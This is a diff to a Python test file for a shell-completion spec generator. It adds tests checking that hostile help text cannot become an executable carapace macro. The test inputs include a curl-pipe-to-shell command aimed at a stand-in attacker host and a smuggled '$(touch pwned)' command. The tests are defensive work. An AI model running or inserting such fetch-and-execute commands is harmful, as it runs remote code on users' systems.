@@ -1,4 +1,5 @@
 import json
+import re
 import tempfile
 import threading
 import time
@@ -31,6 +32,14 @@ Global options:
   -m, --mode <value>
       Set the agent mode
 """
+
+
+ROOT = Path(__file__).parents[1]
+JSON_STRING = r'"(?:[^"\\]|\\.)*"'
+COMPLETION_VALUES = re.compile(rf"^(?!\s*aliases:).*?(\[{JSON_STRING}(?:, {JSON_STRING})*\])$")
+HELPER_MACRO = re.compile(
+    r'\$sh\("\$\{XDG_CONFIG_HOME:-\$HOME/\.config\}/carapace/bin/amp-completions" (?P<resource>[a-z-]+)\)'
+)
 
 
 class ParseHelpTest(unittest.TestCase):
@@ -305,6 +314,51 @@ class RenderTest(unittest.TestCase):
             '            - ["$sh(\\"${XDG_CONFIG_HOME:-$HOME/.config}/carapace/bin/amp-completions\\" threads)"]\n'
             '            - ["blue", "purple", "pink", "red", "orange", "yellow", "green", "cyan"]',
             rendered,
+        )
+
+
+def unknown_macros(spec: str) -> list[str]:
+    values = [
+        value
+        for line in spec.splitlines()
+        if (match := COMPLETION_VALUES.match(line))
+        for value in json.loads(match[1])
+    ]
+    return [
+        value
+        for value in values
+        if value.startswith("$")
+        and value not in {"$files", "$directories"}
+        and not (
+            (match := HELPER_MACRO.fullmatch(value))
+            and match["resource"] in generate.DYNAMIC_COMPLETION_RESOURCES
+        )
+    ]
+
+
+class MacroSafetyTest(unittest.TestCase):
+    def test_help_text_never_becomes_a_carapace_macro(self) -> None:
+        command = generate.Command(
+            "amp",
+            options=[generate.Option("--thread=", '$sh(curl https://attacker.test | sh)')],
+            commands=[generate.Command("$(touch pwned)", "$sh(touch pwned)")],
+        )
+
+        rendered = generate.render(command, "1.2.3")
+
+        self.assertIn("attacker.test", rendered)
+        self.assertEqual(unknown_macros(rendered), [])
+
+    def test_checked_in_spec_uses_only_known_macros(self) -> None:
+        spec = (ROOT / "amp.yaml").read_text()
+
+        self.assertIn("amp-completions\\\" threads)", spec)
+        self.assertEqual(unknown_macros(spec), [])
+
+    def test_detects_unknown_macros(self) -> None:
+        self.assertEqual(
+            unknown_macros('          "x": ["$files", "$sh(curl https://attacker.test)"]'),
+            ["$sh(curl https://attacker.test)"],
         )
 
 
